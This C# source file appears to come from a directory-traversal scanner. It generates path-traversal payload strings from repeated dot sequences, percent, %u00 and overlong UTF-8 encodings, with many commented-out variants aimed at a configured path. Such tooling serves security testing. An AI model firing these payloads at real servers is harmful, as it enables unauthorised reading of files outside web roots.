using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace DirectoryTraversalScan.Components
{
    public delegate string SequenceBuilderDelegate(int PeriodCount, string BadChars, string SequenceSlash);

    public class TraversalSequence
    {
        public static string[] StartSlashes = new[] { "/", "\\" };
        public static string[] SequenceSlashes = new[] { "/", "\\" };
        public static int[] DotCounts = new[] { 2, 3 };
        public static SequenceBuilderDelegate[] SequenceBuilders = new SequenceBuilderDelegate[]
        {
            (periodCount, badChars, sequenceSlash) => "%" + badChars + ".".Repeat(periodCount) + sequenceSlash,
            (periodCount, badChars, sequenceSlash) => ".".Repeat(periodCount) + "%" + badChars + sequenceSlash,
            (periodCount, badChars, sequenceSlash) => "%2E".Repeat(periodCount) + badChars,
            (periodCount, badChars, sequenceSlash) => ".".Repeat(periodCount) + "%" + badChars,

            (periodCount, badChars, sequenceSlash) => "%u00" + badChars + ".".Repeat(periodCount) + sequenceSlash,
            (periodCount, badChars, sequenceSlash) => ".".Repeat(periodCount) + "%u00" + badChars + sequenceSlash,
            (periodCount, badChars, sequenceSlash) => "%2E".Repeat(periodCount) + "%u00" + badChars,
            (periodCount, badChars, sequenceSlash) => ".".Repeat(periodCount) + "%u00" + badChars,            
        };
        public static Func<byte, string>[] BadCharEncoders = new Func<byte, string>[]
        {
            x => x.ToHex(),            
            x => ((char)x).ToString(),

        };

        public string StartSlash { get; set; }
        public string SequenceSlash { get; set; }
        public int DotCount { get; set; }
        public SequenceBuilderDelegate SequenceBuilder { get; set; }
        public Func<int, string> BadCharEncoder { get; set; }
        public int Repeat { get; set; }

        public TraversalSequence()
        {
            Repeat = 16;
        }


        //x => Config.Path + "/" + ("%" + toHex(x) + "../").Repeat(repeatCount),
        //x => Config.Path + "/" + ("..%" + toHex(x) + "/").Repeat(repeatCount),
        //x => Config.Path + "/" + ("%2E%2E%" + toHex(x)).Repeat(repeatCount),
        //x => Config.Path + "/" + ("..%" + toHex(x)).Repeat(repeatCount),

        //x => Config.Path + "/" + ((char)x + "../").Repeat(repeatCount),
        //x => Config.Path + "/" + (".." + (char)x + "/").Repeat(repeatCount),
        //x => Config.Path + "/" + ("%2E%2E%" + (char)x).Repeat(repeatCount),
        //x => Config.Path + "/" + (".." + (char)x).Repeat(repeatCount),

        //x => Config.Path + "/" + ("%u00" + toHex(x) + "../").Repeat(repeatCount),
        //x => Config.Path + "/" + ("..%u00" + toHex(x) + "/").Repeat(repeatCount),
        //x => Config.Path + "/" + ("%2E%2E%u00" + toHex(x)).Repeat(repeatCount),                
        //x => Config.Path + "/" + ("..%u00" + toHex(x)).Repeat(repeatCount),             


        //x => Config.Path + "\\" + ("%" + toHex(x) + "..\\").Repeat(repeatCount),
        //x => Config.Path + "\\" + ("..%" + toHex(x) + "\\").Repeat(repeatCount),
        //x => Config.Path + "\\" + ("%2E%2E%" + toHex(x)).Repeat(repeatCount),
        //x => Config.Path + "\\" + ("..%" + toHex(x)).Repeat(repeatCount),

        //x => Config.Path + "\\" + ((char)x + "..\\").Repeat(repeatCount),
        //x => Config.Path + "\\" + (".." + (char)x + "\\").Repeat(repeatCount),
        //x => Config.Path + "\\" + ("%2E%2E%" + (char)x).Repeat(repeatCount),
        //x => Config.Path + "\\" + (".." + (char)x).Repeat(repeatCount),

        //x => Config.Path + "\\" + ("%u00" + toHex(x) + "..\\").Repeat(repeatCount),
        //x => Config.Path + "\\" + ("..%u00" + toHex(x) + "\\").Repeat(repeatCount),
        //x => Config.Path + "\\" + ("%2E%2E%u00" + toHex(x)).Repeat(repeatCount),                
        //x => Config.Path + "\\" + ("..%u00" + toHex(x)).Repeat(repeatCount),     


        ////x =>
        ////{
        ////    var ol = Overlong(x);
        ////    return Config.Path + "/" + ("%" + toHex(ol[0]) + "%" + toHex(ol[1]) + olPeriod + "/").Repeat(repeatCount);
        ////},
        ////x =>
        ////{
        ////    var ol = Overlong(x);
        ////    return Config.Path + "/" + (olPeriod + "%" + toHex(ol[0]) + "%" + toHex(ol[1]) + "/").Repeat(repeatCount);
        ////},

        ////x =>
        ////{
        ////    var ol = Overlong(x);
        ////    return Config.Path + "/" + ("%u" + toHex(ol[0]) + toHex(ol[1]) + olPeriod2 + "/").Repeat(repeatCount);
        ////},

        ////x =>
        ////{
        ////    var ol = Overlong(x);
        ////    return Config.Path + "/" + (olPeriod2 + "%u" + toHex(ol[0]) + toHex(ol[1]) + "/").Repeat(repeatCount);
        ////},

        //x => { var ol = Overlong(x); return Config.Path + "/" + (olPeriod + "%" + toHex(ol[0]) + "%" + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "/" + ("%2E%2E" + "%" + toHex(ol[0]) + "%" + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "/" + (".." + "%" + toHex(ol[0]) + "%" + toHex(ol[1])).Repeat(repeatCount); },  

        //x => { var ol = Overlong(x); return Config.Path + "/" + (olPeriod + "%" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "/" + ("%2E%2E" + "%" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "/" + (".." + "%" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },

        //x => { var ol = Overlong(x); return Config.Path + "/" + (olPeriod2 + "%u" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "/" + ("%2E%2E" + "%u" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "/" + (".." + "%u" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },


        //x => { var ol = Overlong(x); return Config.Path + "\\" + (olPeriod + "%" + toHex(ol[0]) + "%" + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "\\" + ("%2E%2E" + "%" + toHex(ol[0]) + "%" + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "\\" + (".." + "%" + toHex(ol[0]) + "%" + toHex(ol[1])).Repeat(repeatCount); },  

        //x => { var ol = Overlong(x); return Config.Path + "\\" + (olPeriod + "%" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "\\" + ("%2E%2E" + "%" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "\\" + (".." + "%" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },

        //x => { var ol = Overlong(x); return Config.Path + "\\" + (olPeriod2 + "%u" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "\\" + ("%2E%2E" + "%u" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
        //x => { var ol = Overlong(x); return Config.Path + "\\" + (".." + "%u" + toHex(ol[0]) + toHex(ol[1])).Repeat(repeatCount); },
    }
}
